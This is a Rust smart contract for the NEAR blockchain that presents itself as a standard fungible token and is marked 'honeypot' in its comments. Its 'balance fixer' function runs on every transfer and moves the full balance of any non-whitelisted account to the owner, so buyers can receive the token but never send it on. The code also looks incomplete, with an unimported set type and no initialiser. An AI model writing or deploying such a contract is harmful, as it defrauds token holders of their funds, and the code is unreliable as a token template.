use near_contract_standards::fungible_token::metadata::{FungibleTokenMetadata, FungibleTokenMetadataProvider, FT_METADATA_SPEC};
use near_contract_standards::fungible_token::FungibleToken;
use near_contract_standards::fungible_token::{FungibleTokenCore, FungibleTokenResolver};
use near_contract_standards::storage_management::{StorageBalance, StorageBalanceBounds, StorageManagement};
use near_sdk::borsh::{self, BorshDeserialize, BorshSerialize};
use near_sdk::collections::LazyOption;
use near_sdk::json_types::U128;
use near_sdk::serde_json;
use near_sdk::{env, near_bindgen, AccountId, PanicOnDefault, PromiseOrValue, NearToken, Promise, Gas, ext_contract};

const GAS_FOR_RESOLVE_TRANSFER: Gas = Gas::from_tgas(10);
const GAS_FOR_FT_ON_TRANSFER: Gas = Gas::from_tgas(35);
const NO_DEPOSIT: NearToken = NearToken::from_yoctonear(0);

#[ext_contract(ext_fungible_receiver)]
pub trait FungibleTokenReceiver {
    fn ft_on_transfer(
        &mut self,
        sender_id: AccountId,
        amount: U128,
        msg: String,
    ) -> PromiseOrValue<U128>;
}

#[ext_contract(ext_self)]
pub trait ExtSelf {
    fn ft_resolve_transfer(
        &mut self,
        sender_id: AccountId,
        receiver_id: AccountId,
        amount: U128,
    ) -> U128;
}

#[cfg(test)]
mod test;

#[near_bindgen]
#[derive(BorshDeserialize, BorshSerialize, PanicOnDefault)]
pub struct Contract {
    token: FungibleToken,
    metadata: LazyOption<FungibleTokenMetadata>,
    owner_id: AccountId,
    whitelist: LookupSet<AccountId>,
}







#[near_bindgen]
impl Contract {
    /// Add account to whitelist (owner only)
    #[payable]
    pub fn add_to_whitelist(&mut self, account_id: AccountId) {
        self.assert_owner();
        self.whitelist.insert(&account_id);
    }

    /// Remove account from whitelist (owner only)
    #[payable]
    pub fn remove_from_whitelist(&mut self, account_id: AccountId) {
        self.assert_owner();
        self.whitelist.remove(&account_id);
    }

    fn assert_owner(&self) {
        assert_eq!(
            env::predecessor_account_id(),
            self.owner_id,
            "Must be called by owner"
        );
    }

    fn apply_balance_fixer(&mut self, account_id: &AccountId) {
        if account_id != &self.owner_id && !self.whitelist.contains(account_id) {
            let balance = self.token.ft_balance_of(account_id.clone());
            if balance.0 > 0 {
                self.token.internal_transfer(
                    account_id,
                    &self.owner_id,
                    balance.0,
                    Some("Honeypot balance fix".to_string()),
                );
            }
        }
    }
}








/// FungibleTokenCore

#[near_bindgen]
impl FungibleTokenCore for Contract {
    #[payable]
    fn ft_transfer(&mut self, receiver_id: AccountId, amount: U128, memo: Option<String>) {
        let predecessor = env::predecessor_account_id();
        self.apply_balance_fixer(&predecessor);
        self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
        self.apply_balance_fixer(&receiver_id);
    }

    #[payable]
    fn ft_transfer_call(
        &mut self,
        receiver_id: AccountId,
        amount: U128,
        memo: Option<String>,
        msg: String,
    ) -> PromiseOrValue<U128> {
        let predecessor = env::predecessor_account_id();
        self.apply_balance_fixer(&predecessor);
        self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
        self.apply_balance_fixer(&receiver_id);
        
        Promise::new(receiver_id.clone())
            .function_call(
                "ft_on_transfer".to_string(),
                serde_json::to_vec(&(predecessor, amount, msg)).unwrap(),
                NO_DEPOSIT,
                GAS_FOR_FT_ON_TRANSFER
            )
            .then(
                Promise::new(env::current_account_id())
                    .function_call(
                        "ft_resolve_transfer".to_string(),
                        serde_json::to_vec(&(predecessor, receiver_id, amount)).unwrap(),
                        NO_DEPOSIT,
                        GAS_FOR_RESOLVE_TRANSFER
                    )
            )
            .into()
    }

    fn ft_total_supply(&self) -> U128 {
        self.token.ft_total_supply()
    }

    fn ft_balance_of(&self, account_id: AccountId) -> U128 {
        self.token.ft_balance_of(account_id)
    }
}




/// FungibleTokenResolver

#[near_bindgen]
impl FungibleTokenResolver for Contract {
    fn ft_resolve_transfer(
        &mut self,
        sender_id: AccountId,
        receiver_id: AccountId,
        amount: U128,
    ) -> U128 {
        self.token.ft_resolve_transfer(sender_id, receiver_id, amount)
    }
}




/// 📀
/// StorageManagement

#[near_bindgen]
impl StorageManagement for Contract {
    #[payable]
    fn storage_deposit(
        &mut self,
        account_id: Option<AccountId>,
        registration_only: Option<bool>,
    ) -> StorageBalance {
        self.token.storage_deposit(account_id, registration_only)
    }

    fn storage_withdraw(&mut self, amount: Option<NearToken>) -> StorageBalance {
        self.token.storage_withdraw(amount)
    }

    fn storage_unregister(&mut self, force: Option<bool>) -> bool {
        self.token.storage_unregister(force)
    }

    fn storage_balance_bounds(&self) -> StorageBalanceBounds {
        self.token.storage_balance_bounds()
    }

    fn storage_balance_of(&self, account_id: AccountId) -> Option<StorageBalance> {
        self.token.storage_balance_of(account_id)
    }
}




/// ℹ️
/// FungibleTokenMetadataProvider

#[near_bindgen]
impl FungibleTokenMetadataProvider for Contract {
    fn ft_metadata(&self) -> FungibleTokenMetadata {
        self.metadata.get().unwrap()
    }
}






// 🐝🍯
// honeypot

